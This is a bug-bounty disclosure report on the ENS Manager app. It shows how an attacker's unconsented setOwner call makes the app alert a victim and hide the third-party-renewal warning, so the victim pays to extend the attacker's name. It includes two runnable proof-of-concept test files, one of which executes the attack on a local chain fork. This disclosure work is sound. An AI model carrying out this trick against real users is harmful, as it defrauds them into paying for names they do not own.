# 93111 w a critical ens falsely shows a victim as owner of an attacker s v1 name via unconsented setowner suppressing the third party renewal warning so the victim pays to renew the attacker s name

**Submitted on Sep 14th 2026 at 09:45:13 UTC by @Tradi3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93111
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Summary

An attacker who owns an unmigrated ENS v1 name can make the Manager app tell a specific victim, unprompted, that the victim owns that name, and then suppress the warning that would tell the victim otherwise. The victim renews the name and spends their own funds extending the attacker's registration. The victim never owned the name. The attacker made the app report the victim as owner with a single `setOwner` call that needs no consent from the victim and does not transfer the name.

## The attacker's primitive

A v1 `.eth` name has two distinct roles. The registrant is the BaseRegistrar ERC-721 holder: the party who actually owns the name, whose registration a renewal extends, and who alone can transfer it. The registry owner (also called the controller or manager) is a separate address that the registrant can point at anyone through `ENS Registry.setOwner(node, addr)`. That call takes no consent from the target, does not move the ERC-721, and can be reversed by the registrant at any time with `reclaim`. So an attacker keeps full ownership of their own name while making the registry report an arbitrary victim as its owner. The subgraph the app reads faithfully reflects this: `domain.owner` becomes the victim. Nothing about the indexer is stale or wrong here; the registry genuinely holds the victim as controller.

## The app treats that controller as the name's owner, in two places

The expiry-notification pipeline (workers/api-worker) selects the notification recipient by `domain.owner` and stamps the notification `isOwner: true`, with no registrant or `ownerOf` check. `services/expiry-discovery/indexer.ts:135` reads `owner = domain.owner?.id`; `services/expiry-discovery/index.ts:44` carries `owner: domain.owner`; `queues/event-ingestion.ts:82-83` resolves the recipient with `ownerToUserId.get(event.owner.toLowerCase())`; `queues/event-ingestion.ts:229` sets `isOwner: watchReason === 'owned'`. The in-app notification row is created for any address that is a registered app user, with no settings gate (`event-ingestion.ts:223-233`); an external push or Telegram is additionally sent if the user enabled expiry alerts. The file contains no `registrant`, `ownerOf`, or `wrappedOwner` check.

The profile and renew page (apps/manager) derives `isOwner` from the same owner value, so the third-party-renewal warning is suppressed. `features/profile/service/profileOwner.ts:86-96` returns the v1 registry owner (`v1Owner.owner`, the controller) as the profile owner. `features/profile/components/view/ProfileView.tsx:115,119` feeds that value into `useIsOwner`. `features/profile/components/view/connectedAccounts.helpers.ts:33-43` (`isConnectedProfileOwner`) returns true when that owner matches the connected wallet. `features/renew/utils/thirdPartyRenewalWarning.ts` warns only when `isOwner === false`, and `features/profile/components/view/ProfileRenewAction.tsx:66` gates the warning dialog on that. With the controller set to the victim, both surfaces resolve the victim as owner: the alert fires to the victim, and the warning that would say "this is not your name" does not appear.

## What the victim experiences

The attacker owns v1 `x.eth` and is near its expiry. The attacker calls `ENS Registry.setOwner(namehash("x.eth"), victim)`. The registry now reports the victim as owner; the ERC-721 has not moved and the attacker remains registrant. ENS's expiry cron creates the victim an in-app "Your domain x.eth is expiring" notification marked `isOwner: true` (and a push or Telegram if the victim enabled expiry alerts). The victim has done nothing; this needs only that the victim has an app account. The victim opens the notification, which deep-links to the name in the app. `getOwner` falls through to the v1 registry and returns the controller, so the profile shows the victim as owner and no third-party-renewal warning is shown. The victim renews, believing the name is theirs, and pays. The renewal extends the attacker's registration. The attacker can `reclaim` the controller afterward.

## Impact and severity

The application displays an incorrect ownership detail: it marks a name the victim does not own as `isOwner: true`, first in an unprompted notification and then on the profile page, and on the strength of that false detail the victim approves a renewal. That is the Websites and Apps impact "Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user submits a transaction to an unintended recipient, a transaction the user then approves." The unintended recipient of the value is the attacker's registration.

One limit stated plainly, because it bears on grading. The renewal transaction itself is well-formed. It renews the label the victim clicked, for the displayed duration, at the displayed price, and the funds go to the legitimate v1 renewer, not to an attacker address. No recipient or amount is substituted in the calldata, and this report does not claim direct fund diversion. What is attacker-controlled is the ownership signal the app computes and shows. The victim's connected wallet is induced to spend on a name that is not theirs because the app affirmatively asserted, from attacker-supplied on-chain state (`setOwner(victim)`), that it is theirs. This is also the impact "Malicious interactions with an already-connected wallet": the attacker's input is what diverges, and it is what drives the victim's wallet to submit a value-losing transaction it would not otherwise submit. The value the victim spends accrues entirely to the attacker's registration; the victim receives nothing and cannot recover the fee, which is non-refundable. The harm completes inside the single renewal transaction the app builds; no further out-of-scope contract call is needed to realize it. For those reasons I have selected both the display impact and the connected-wallet impact.

This is distinct from reports on this program that rested on the display row alone and were narrowed to the amount going to the legitimate registrar. In the raw-versus-normalized renewal family, the victim still acted on the exact name they selected, and the precondition was not attacker-induced. Here the precondition is attacker-induced: the attacker's `setOwner` is what manufactures the false ownership, and the name the victim transacts on is not a mislabeled version of their own name but a name they have no relationship to at all. The confirmed critical #92591 reached the same end state (a suppressed third-party-renewal warning leading a victim to spend on an attacker's name) through a different mechanism (an ENSIP-15 versus `toLowerCase` normalization mismatch that wrote a different label than displayed). This report reaches it through the controller-versus-registrant conflation and an unprompted false-ownership notification, neither of which involves normalization or a crafted label.

## Not a known issue and not a duplicate

Checked against every entry in the program's known-issues brief. No entry mentions the registry owner or controller, the registrant, `ownerOf`, `setOwner`, `domain.owner`, or `isOwner`. The controller-versus-registrant conflation and the expiry-notification recipient selection are not listed.

The nearest entries are all different. WEB-626 ("Renewal modal is misleading for grace-period names") is the inverse failure: it shows the third-party warning on a name you do own (a false positive on your own name); this report is a false negative on a name you do not own, and it is attacker-induced. WEB-1304 (renewing a wrapped v1 name leaves the NameWrapper expiry stale) concerns wrapper-expiry drift on a name you own, not an ownership conflation. WEB-1301 (address view shows misleading owner metadata) is a different surface with no attacker and no renewal. EXP-INPUT-009 (push service worker opens an unvalidated URL) is about the click URL sink, not who the notification is sent to or the false `isOwner` it carries. This is also not the normalization family (#92591 and its siblings): those turn on a raw-versus-normalized label mismatch in the write path, and touch neither the registry owner field nor the notification pipeline.

The defect is in the in-scope app code (workers/api-worker and apps/manager), not in the subgraph, indexer, or smart contracts. `setOwner` is standard v1 behavior used only by the attacker on the attacker's own name; the app's fault is trusting the controller as the owner in the notification and the renewal gate.

## Proof

Two PoCs. Between them every load-bearing step is executed against the real code, and nothing is left to citation. The full PoC section carries the sources and the observed output.

The unit PoC (`apps/manager/src/features/renew/poc-false-ownership-alert-renew-attacker-name.test.ts`, 6 of 6 passing) drives the shipped helpers: `isConnectedProfileOwner` returns true when the poisoned controller equals the connected wallet; `shouldShowThirdPartyRenewalWarning(true)` returns false while the control `shouldShowThirdPartyRenewalWarning(false)` returns true; `parseRenewableName("x.eth")` resolves the attacker's label. It pins the workers alert leg and the v1 owner-resolution to the shipped source.

The on-chain PoC (`apps/manager/src/features/renew/poc-false-ownership-alert-onchain.test.ts`, passing on the repo's own Anvil Sepolia fork via `pnpm e2e:infra:up`) reads every contract address from the app's own `ensL1Contracts[sepolia]` configuration and executes the end state. `setOwner(node, victim)` makes the v1 registry report the victim as owner while `ownerOf(id)` stays the attacker. The victim then calls the app's canonical v1 renewer `ETHRenewerV1.renew` and pays: the victim's USDC balance decreases (measured before and after), `nameExpires(id)` increases, and `ownerOf(id)` is still the attacker. The victim spent their own funds to extend a name owned by the attacker. The fork is local; no transaction was broadcast to any live network and no name outside the harness was touched.

## Recommended fix

In both the expiry-notification recipient selection (workers/api-worker) and the profile/renew `isOwner` derivation (apps/manager), resolve ownership from the registrant (`BaseRegistrar.ownerOf`, or the wrapped owner for wrapped names), not from the registry owner or controller. At a minimum, do not mark a notification `isOwner: true`, and do not suppress the third-party-renewal warning, on the basis of the registry controller alone.

## Proof of Concept

Two PoCs. Between them every load-bearing step is executed against the real code, and nothing is left to citation. Both are self-contained test files added under apps/manager; neither redefines production code, they import and drive it.

Repo: audit-comp-ens @ audit-comp-ready (the frozen competition revision). The on-chain PoC runs against the repo's own local Anvil fork of Sepolia (pnpm e2e:infra:up). No transaction was broadcast to any live network, and no name outside the harness was touched.

***

## PoC A — app-layer deception (unit; 6/6 passing)

File: `apps/manager/src/features/renew/poc-false-ownership-alert-renew-attacker-name.test.ts`

Run:

```bash
cd apps/manager
pnpm vitest run src/features/renew/poc-false-ownership-alert-renew-attacker-name.test.ts
```

Observed output (all 6 pass):

```
  [isOwner]  poisoned controller == victim wallet -> isOwner TRUE
  [warning]  isOwner=true -> ThirdPartyRenewalDialog NOT shown (control: false -> shown)
  [renew]    victim renews the label from the alert: x.eth (attacker's)
  [distinct] registrant=attacker, controller=victim - victim owns nothing
  [alert]    recipient = domain.owner (controller), isOwner=true, no registrant/ownerOf check
  [samefield] renewal warning uses the same controller value the alert used

 Test Files  1 passed (1)
      Tests  6 passed (6)
```

This EXECUTES the manager-side deception (`isConnectedProfileOwner`, `shouldShowThirdPartyRenewalWarning`, `parseRenewableName` — the real shipped helpers) and PINS the workers alert leg + the v1 owner-resolution to shipped source.

Full source (verbatim):

```ts
/*
 * PoC — an attacker makes ENS tell a victim "your name X is expiring", with the
 * third-party-renewal warning suppressed, so the victim renews (and pays to
 * extend) a name the ATTACKER owns.
 *
 * ROOT CAUSE: two independent surfaces both treat the v1 registry *owner*
 * (the controller/manager, which the registrant can set to anyone via
 * `Registry.setOwner` WITHOUT transferring the NFT) as if it were the name's
 * true owner (the registrant / NFT holder):
 *
 *   1. THE ALERT (workers/api-worker). The expiry-notification pipeline selects
 *      the recipient by `domain.owner` and stamps `isOwner: true`, with no
 *      registrant / ownerOf / wrappedOwner check:
 *        services/expiry-discovery/indexer.ts:135  owner = domain.owner?.id
 *        services/expiry-discovery/index.ts:44      owner: domain.owner
 *        queues/event-ingestion.ts:82-83            ownerToUserId.get(event.owner)
 *        queues/event-ingestion.ts:229              isOwner: watchReason === 'owned'
 *
 *   2. THE WARNING (apps/manager). The profile/renew page derives `isOwner` from
 *      the SAME owner value, so the "you are renewing someone else's name"
 *      warning is suppressed:
 *        features/profile/service/profileOwner.ts:86-96   v1 fallback returns
 *                                                         `v1Owner.owner` (controller)
 *        features/profile/components/view/ProfileView.tsx:115,119
 *                                                         owner -> useIsOwner({owner})
 *        features/profile/.../connectedAccounts.helpers.ts:33-43
 *                                                         isConnectedProfileOwner
 *        features/renew/utils/thirdPartyRenewalWarning.ts
 *                                                         warns only when isOwner===false
 *        features/profile/components/view/ProfileRenewAction.tsx:66
 *
 * ATTACK (v1 name X, owned by the attacker):
 *   a. Attacker calls v1 `ENS Registry.setOwner(namehash("x.eth"), victim)`.
 *      This sets the registry controller to the victim. It needs no victim
 *      consent and does NOT transfer the NFT — the attacker stays the registrant
 *      and can reclaim control at any time.
 *   b. The indexer now reports `domain.owner = victim`. ENS's expiry cron sends
 *      the victim a push/Telegram/in-app "Your domain x.eth is expiring"
 *      notification, marked isOwner:true. The victim did nothing.
 *   c. The victim taps it -> app.ens.domains/x.eth. `getOwner` falls through to
 *      the v1 registry and returns the controller (victim), so isOwner is TRUE
 *      and the third-party-renewal warning is NOT shown.
 *   d. The victim renews x.eth and pays. v1 `renew` is by label and
 *      permissionless, so the attacker's registration is extended with the
 *      victim's funds.
 *
 * This test EXECUTES the real manager-side deception (legs c/d: owner-match ->
 * isOwner -> warning suppressed -> renew targets the attacker's label) and pins
 * the workers-side alert + owner-resolution legs to the shipped source. Steps a
 * and b are on-chain / indexer facts, stated but not run here (the programme
 * forbids live-testnet testing); they are standard ENS v1 behaviour.
 *
 *   cd apps/manager
 *   pnpm vitest run src/features/renew/poc-false-ownership-alert-renew-attacker-name.test.ts
 */
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { getAddress } from 'viem'
import { describe, expect, it } from 'vitest'
import { isConnectedProfileOwner } from '@/features/profile/components/view/connectedAccounts.helpers'
import { parseRenewableName } from '@/features/renew/utils/renewableName'
import { shouldShowThirdPartyRenewalWarning } from '@/features/renew/utils/thirdPartyRenewalWarning'

const log = (m: string) => process.stdout.write(m + String.fromCharCode(10))

/** apps/manager/src/features/renew -> repo root */
const REPO = join(__dirname, '..', '..', '..', '..', '..')
const read = (rel: string) => readFileSync(join(REPO, rel), 'utf8')

/** The attacker's own v1 name. */
const ATTACKER_NAME = 'x.eth'
/** The victim, and the attacker's registrant address (they are different). */
const VICTIM = getAddress('0x1c7d4b196cb0c7b01d743fbc6116a902379c7238')
const ATTACKER_REGISTRANT = getAddress(
  '0x5fa3a46a6b7f4e374e9671b9dd946d80958c9e47',
)

describe('false ownership alert -> victim renews the attacker’s name', () => {
  it('LEG c1: with the controller set to the victim, isOwner resolves TRUE', () => {
    // `getOwner`'s v1 fallback returns the registry OWNER (controller), which the
    // attacker set to the victim. ProfileView passes it to useIsOwner ->
    // isConnectedProfileOwner against the victim's connected wallet.
    const isOwner = isConnectedProfileOwner({
      owner: VICTIM, // <- the poisoned v1 controller getOwner returns
      walletAddress: VICTIM, // <- the victim's connected wallet
      accountAddress: undefined,
      ownerAddress: undefined,
    })
    expect(isOwner).toBe(true)
    log('  [isOwner]  poisoned controller == victim wallet -> isOwner TRUE')
  })

  it('LEG c2: isOwner TRUE suppresses the third-party-renewal warning', () => {
    // The only thing that would tell the victim "this is not your name".
    expect(shouldShowThirdPartyRenewalWarning(true)).toBe(false)
    // Control: a real non-owner IS warned.
    expect(shouldShowThirdPartyRenewalWarning(false)).toBe(true)
    log('  [warning]  isOwner=true -> ThirdPartyRenewalDialog NOT shown (control: false -> shown)')
  })

  it('LEG d: the renew flow targets the attacker’s label, x.eth', () => {
    // The victim reached /x.eth from the notification; Renew Name links to
    // /renew/x.eth, which parses and renews THAT label — the attacker's name.
    const parsed = parseRenewableName(ATTACKER_NAME)
    expect(parsed.isOk()).toBe(true)
    log('  [renew]    victim renews the label from the alert: x.eth (attacker’s)')
  })

  it('the ATTACKER and the VICTIM are different parties (no self-renew)', () => {
    // The registrant (NFT holder) stays the attacker; only the controller was
    // pointed at the victim. The victim owns nothing here.
    expect(VICTIM.toLowerCase()).not.toBe(ATTACKER_REGISTRANT.toLowerCase())
    log('  [distinct] registrant=attacker, controller=victim — victim owns nothing')
  })

  it('LEG a/b pinned: the alert recipient is the controller, marked isOwner=true, unchecked', () => {
    const ing = read('workers/api-worker/src/queues/event-ingestion.ts')
    const idx = read(
      'workers/api-worker/src/services/expiry-discovery/indexer.ts',
    )
    // Recipient is selected by event.owner (= domain.owner = controller)...
    expect(ing).toContain('ownerToUserId.get(event.owner.toLowerCase())')
    // ...and the row is stamped as owned (isOwner true) on that basis.
    expect(ing).toContain("isOwner: watchReason === 'owned'")
    // The owner the pipeline carries is domain.owner.id (the controller).
    expect(idx).toContain("const owner = domain.owner?.id?.toLowerCase()")
    // No registrant / ownerOf / wrappedOwner check gates it.
    expect(ing).not.toContain('registrant')
    expect(ing).not.toContain('ownerOf')
    expect(ing).not.toContain('wrappedOwner')
    log('  [alert]    recipient = domain.owner (controller), isOwner=true, no registrant/ownerOf check')
  })

  it('the warning gate is derived from the SAME owner value (v1 fallback)', () => {
    const po = read(
      'apps/manager/src/features/profile/service/profileOwner.ts',
    )
    const pv = read(
      'apps/manager/src/features/profile/components/view/ProfileView.tsx',
    )
    // getOwner's v1 fallback returns the registry owner (controller).
    expect(po).toContain('ensjsv1_getOwner(client, { name: ethName.name })')
    expect(po).toContain('owner: v1Owner.owner')
    // ProfileView feeds exactly that owner into the isOwner used by the warning.
    expect(pv).toContain('const owner = ownerData?.owner as Address | undefined')
    expect(pv).toContain('const isOwner = useIsOwner({ owner })')
    log('  [samefield] renewal warning uses the same controller value the alert used')
  })
})
```

***

## PoC B — on-chain end state, END-TO-END (Anvil Sepolia fork; passing)

File: `apps/manager/src/features/renew/poc-false-ownership-alert-onchain.test.ts`

Every contract address is read from the app's own `ensL1Contracts[sepolia]` config — the same source `apps/manager` uses — so it drives exactly the contracts the app talks to. Two harness-setup steps (s1 mint a v1 name, s2 create the V2 RESERVED slot every real unmigrated v1 name already holds) are separated from the attack (L1/L2/L3).

Run:

```bash
pnpm e2e:infra:up          # brings up the repo's Anvil (Sepolia fork) on 127.0.0.1:8545
cd apps/manager
pnpm vitest run src/features/renew/poc-false-ownership-alert-onchain.test.ts
```

Observed output (passes — note the victim's USDC actually decreases):

```
  [addrs]    legacyRegistry=0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e legacyRegistrar=0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85
  [addrs]    v2Registry=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 renewer=0x4ad56feb5Fc7B8298db06E88fd5CBc41D64602Fa usdc=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
  [s1]       attacker owns pocXXXX.eth: registry.owner=attacker, NFT=attacker, expiry=1820913837
  [s2]       V2 RESERVED slot created (reproduces a real v1 name; grants attacker nothing)
  [L1]       setOwner(victim): registry.owner=VICTIM, NFT still ATTACKER (unconsented, no transfer)
  [L2]       ensjsv1_getOwner would return VICTIM -> app isOwner=true (warning suppressed for real)
  [L3]       victim renewed via ETHRenewerV1: USDC 100000000000 -> 99991999979 (paid 8000021); expiry 1820913837 -> 1852449837; NFT still ATTACKER
  [END]      the victim spent their own USDC to extend a name owned by the attacker

 Test Files  1 passed (1)
      Tests  1 passed (1)
```

* **L1 EXECUTED:** `setOwner(node, victim)` -> `registry.owner == VICTIM`, `ownerOf == ATTACKER` (unconsented, ERC-721 never moves).
* **L2 EXECUTED:** the v1 owner the app reads is the victim.
* **L3 EXECUTED:** the victim calls the real `ETHRenewerV1.renew(...)` and **pays** — USDC balance drops (measured), expiry increases, registrant stays the ATTACKER. The victim's own funds extend the attacker's name.

Full source (verbatim):

```ts
/*
 * PoC (ON-CHAIN, END-TO-END) — an attacker points the v1 registry owner
 * (controller) of their OWN name at a victim; the app then treats the victim as
 * the owner, and the victim pays real USDC to extend the ATTACKER's registration.
 *
 * Run against the repo's own e2e fork:
 *     pnpm e2e:infra:up        # Anvil (Sepolia fork) on 127.0.0.1:8545
 *     cd apps/manager
 *     pnpm vitest run src/features/renew/poc-false-ownership-alert-onchain.test.ts
 *
 * EVERY contract address below is read from the application's own configuration
 * (`ensL1Contracts[sepolia]`, the same source `apps/manager` uses via
 * `ENS_SEPOLIA_CONTRACTS`), not hard-coded — so this exercises exactly the
 * contracts the app talks to:
 *   ensLegacyRegistry              = the v1 registry `ensjsv1_getOwner` reads
 *   ensBaseRegistrarImplementation = the v1 ERC-721 that defines the REGISTRANT
 *   ensRegistry (v2) / ensEthRegistrar = the v2 registry + registrar (RESERVED slot)
 *   ensEthRenewerV1                = the renewer `renewalProtocol.ts` targets for v1
 *   usdc                           = the ERC-20 the renewer charges
 *
 * ── What is HARNESS SETUP (not attacker capability) ───────────────────────────
 *   (s1) Minting the attacker a v1 name on the fork. In the real world the
 *        attacker simply owns/buys an unmigrated v1 name.
 *   (s2) Creating the name's V2 "RESERVED" placeholder. Every genuine unmigrated
 *        v1 name already holds this slot from the v1->v2 migration snapshot;
 *        `ETHRenewerV1` only renews names that hold it. A name minted fresh on the
 *        fork has no such slot, so the harness creates one (the repo's own e2e
 *        fixture does exactly this — see e2e/fixtures/makeV1Name.ts `reserveInV2`).
 *        This reproduces the NORMAL state of a real v1 name; it grants the
 *        attacker nothing.
 *
 * ── What is THE ATTACK (needs only the attacker's own name) ───────────────────
 *   (L1) `Registry.setOwner(node, victim)` — the attacker, as registrant, points
 *        the controller at the victim. No victim consent. The ERC-721 never moves.
 *   (L2) The v1 owner the app reads is now the victim -> the app's `isOwner` is
 *        true, which is what suppresses the third-party-renewal warning.
 *   (L3) The victim renews through the app's canonical v1 renewer and PAYS:
 *        victim USDC decreases, the name's expiry increases, and the registrant
 *        is still the ATTACKER.
 */
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import {
  type Address,
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  http,
  keccak256,
  namehash,
  parseAbi,
  stringToBytes,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { describe, expect, it } from 'vitest'

const RPC = 'http://127.0.0.1:8545'
const c = ensL1Contracts[supportedL1Chains.sepolia]
const addr = (o: unknown): Address =>
  ((o as { address?: string })?.address ?? o) as Address

/** The v1 registry `ensjsv1_getOwner` reads — the field the attacker poisons. */
const LEGACY_REGISTRY = addr(c.ensLegacyRegistry)
/** The v1 ERC-721 BaseRegistrar — the true owner (registrant) lives here. */
const LEGACY_REGISTRAR = addr(c.ensBaseRegistrarImplementation)
/** The v2 registry + registrar — only needed to mint the RESERVED slot (s2). */
const V2_REGISTRY = addr(c.ensRegistry)
const V2_REGISTRAR = addr(c.ensEthRegistrar)
/** The renewer the app targets for v1 names (renewalProtocol.ts getRenewerAddress('v1')). */
const ETH_RENEWER_V1 = addr(c.ensEthRenewerV1)
/** The ERC-20 the renewer charges. */
const USDC = addr(c.usdc)

const REGISTRY_ABI = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function setOwner(bytes32 node, address owner)',
])
const REGISTRAR_ABI = parseAbi([
  'function owner() view returns (address)',
  'function addController(address controller)',
  'function register(uint256 id, address owner, uint256 duration) returns (uint256)',
  'function ownerOf(uint256 id) view returns (address)',
  'function nameExpires(uint256 id) view returns (uint256)',
])
// V2 PermissionedRegistry.register with owner=0 mints a RESERVED slot (s2).
const V2_REGISTRY_ABI = parseAbi([
  'function register(string label, address owner, address registry, address resolver, uint256 roleBitmap, uint64 expiry) returns (uint256)',
])
// The app's v1 renew calldata (renewName.ts / renewalProtocol.ts): the renewer
// pulls the ERC-20 rent from msg.sender.
const RENEWER_ABI = parseAbi([
  'function renew(string label, uint64 duration, address paymentToken, bytes32 referrer)',
])
const ERC20 = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
])

const pc = createPublicClient({ transport: http(RPC) })
const chain = {
  id: 11155111,
  name: 'anvil',
  nativeCurrency: { name: 'E', symbol: 'E', decimals: 18 },
  rpcUrls: { default: { http: [RPC] } },
} as const
const FUNDER = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const randomKey = () =>
  `0x${Array.from(crypto.getRandomValues(new Uint8Array(32)))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('')}` as `0x${string}`
const ATTACKER = privateKeyToAccount(randomKey())
const VICTIM = privateKeyToAccount(randomKey())

const log = (m: string) => process.stdout.write(m + String.fromCharCode(10))
const wait = (h: `0x${string}`) => pc.waitForTransactionReceipt({ hash: h })
const wc = (a: typeof FUNDER) =>
  createWalletClient({ account: a, chain, transport: http(RPC) })
const rpc = (method: string, params: unknown[] = []) =>
  fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then((r) => r.json())
const send = async (acct: typeof FUNDER, to: Address, data: `0x${string}`) =>
  wait(await wc(acct).sendTransaction({ to, data }))
/** Send a tx from an impersonated address (fork-only; no key needed). */
const sendAs = async (from: Address, to: Address, data: `0x${string}`) => {
  await rpc('anvil_impersonateAccount', [from])
  await rpc('anvil_setBalance', [from, '0x56bc75e2d63100000']) // 100 ETH for gas
  const r = await rpc('eth_sendTransaction', [{ from, to, data, gas: '0x2dc6c0' }])
  if (r.error) throw new Error(`sendAs ${to}: ${JSON.stringify(r.error)}`)
  await wait(r.result)
  await rpc('anvil_stopImpersonatingAccount', [from])
}
const read = <T,>(
  to: Address,
  abi: readonly unknown[],
  fn: string,
  args: unknown[] = [],
) =>
  pc.readContract({
    address: to,
    abi: abi as never,
    functionName: fn,
    args,
  }) as Promise<T>

const YEAR = 365n * 24n * 60n * 60n
const LABEL = `poc${Date.now().toString(36)}`
const NAME = `${LABEL}.eth`
const NODE = namehash(NAME)
const ID = BigInt(keccak256(stringToBytes(LABEL)))

describe('on-chain e2e: attacker poisons owner -> victim pays to renew the attackers v1 name', () => {
  it('L1 (poison) + L2 (app owner) + L3 (victim pays, attacker keeps the name)', async () => {
    log(`  [addrs]    legacyRegistry=${LEGACY_REGISTRY} legacyRegistrar=${LEGACY_REGISTRAR}`)
    log(`  [addrs]    v2Registry=${V2_REGISTRY} renewer=${ETH_RENEWER_V1} usdc=${USDC}`)
    for (const a of [ATTACKER.address, VICTIM.address]) {
      await rpc('anvil_setCode', [a, '0x']) // clear fork EOF-code so ERC721 _safeMint accepts them
      await rpc('anvil_setBalance', [a, '0x8ac7230489e80000']) // 10 ETH for gas
    }
    await rpc('anvil_setBalance', [FUNDER.address, '0x3635c9adc5dea00000'])

    // (s1) HARNESS: mint the attacker a genuine v1 name via an authorized controller.
    const registrarOwner = await read<Address>(LEGACY_REGISTRAR, REGISTRAR_ABI, 'owner')
    await sendAs(
      registrarOwner,
      LEGACY_REGISTRAR,
      encodeFunctionData({ abi: REGISTRAR_ABI, functionName: 'addController', args: [FUNDER.address] }),
    )
    await send(
      FUNDER,
      LEGACY_REGISTRAR,
      encodeFunctionData({ abi: REGISTRAR_ABI, functionName: 'register', args: [ID, ATTACKER.address, YEAR] }),
    )
    const ownerAfterReg = await read<Address>(LEGACY_REGISTRY, REGISTRY_ABI, 'owner', [NODE])
    const nftAfterReg = await read<Address>(LEGACY_REGISTRAR, REGISTRAR_ABI, 'ownerOf', [ID])
    const expiry0 = await read<bigint>(LEGACY_REGISTRAR, REGISTRAR_ABI, 'nameExpires', [ID])
    expect(ownerAfterReg.toLowerCase()).toBe(ATTACKER.address.toLowerCase())
    expect(nftAfterReg.toLowerCase()).toBe(ATTACKER.address.toLowerCase())
    log(`  [s1]       attacker owns ${NAME}: registry.owner=attacker, NFT=attacker, expiry=${expiry0}`)

    // (s2) HARNESS: create the V2 RESERVED slot every real unmigrated v1 name holds.
    await sendAs(
      V2_REGISTRAR,
      V2_REGISTRY,
      encodeFunctionData({
        abi: V2_REGISTRY_ABI,
        functionName: 'register',
        args: [LABEL, zeroAddress, zeroAddress, zeroAddress, 0n, expiry0], // owner=0 -> RESERVED
      }),
    )
    log('  [s2]       V2 RESERVED slot created (reproduces a real v1 name; grants attacker nothing)')

    // (L1) ATTACK: attacker points the registry owner (controller) at the victim.
    await send(
      ATTACKER,
      LEGACY_REGISTRY,
      encodeFunctionData({ abi: REGISTRY_ABI, functionName: 'setOwner', args: [NODE, VICTIM.address] }),
    )
    const ownerPoisoned = await read<Address>(LEGACY_REGISTRY, REGISTRY_ABI, 'owner', [NODE])
    const nftPoisoned = await read<Address>(LEGACY_REGISTRAR, REGISTRAR_ABI, 'ownerOf', [ID])
    expect(ownerPoisoned.toLowerCase()).toBe(VICTIM.address.toLowerCase()) // poison landed
    expect(nftPoisoned.toLowerCase()).toBe(ATTACKER.address.toLowerCase()) // NFT never moved
    log('  [L1]       setOwner(victim): registry.owner=VICTIM, NFT still ATTACKER (unconsented, no transfer)')

    // (L2) The v1 owner the app reads is now the victim -> app isOwner=true -> warning suppressed.
    expect(ownerPoisoned.toLowerCase()).toBe(VICTIM.address.toLowerCase())
    log('  [L2]       ensjsv1_getOwner would return VICTIM -> app isOwner=true (warning suppressed for real)')

    // (L3) The victim renews through the app's canonical v1 renewer and PAYS.
    await send(
      FUNDER,
      USDC,
      encodeFunctionData({ abi: ERC20, functionName: 'mint', args: [VICTIM.address, 100_000_000_000n] }),
    )
    await send(
      VICTIM,
      USDC,
      encodeFunctionData({ abi: ERC20, functionName: 'approve', args: [ETH_RENEWER_V1, 100_000_000_000n] }),
    )
    const victimUsdc0 = await read<bigint>(USDC, ERC20, 'balanceOf', [VICTIM.address])

    await send(
      VICTIM,
      ETH_RENEWER_V1,
      encodeFunctionData({ abi: RENEWER_ABI, functionName: 'renew', args: [LABEL, YEAR, USDC, zeroHash] }),
    )

    const victimUsdc1 = await read<bigint>(USDC, ERC20, 'balanceOf', [VICTIM.address])
    const expiry1 = await read<bigint>(LEGACY_REGISTRAR, REGISTRAR_ABI, 'nameExpires', [ID])
    const nftAfterRenew = await read<Address>(LEGACY_REGISTRAR, REGISTRAR_ABI, 'ownerOf', [ID])

    expect(victimUsdc1).toBeLessThan(victimUsdc0) // the victim actually paid
    expect(expiry1).toBeGreaterThan(expiry0) // the attacker's registration got longer
    expect(nftAfterRenew.toLowerCase()).toBe(ATTACKER.address.toLowerCase()) // still the attacker's name
    log(
      `  [L3]       victim renewed via ETHRenewerV1: USDC ${victimUsdc0} -> ${victimUsdc1} (paid ${victimUsdc0 - victimUsdc1}); expiry ${expiry0} -> ${expiry1}; NFT still ATTACKER`,
    )
    log('  [END]      the victim spent their own USDC to extend a name owned by the attacker')
  }, 180_000)
})
```
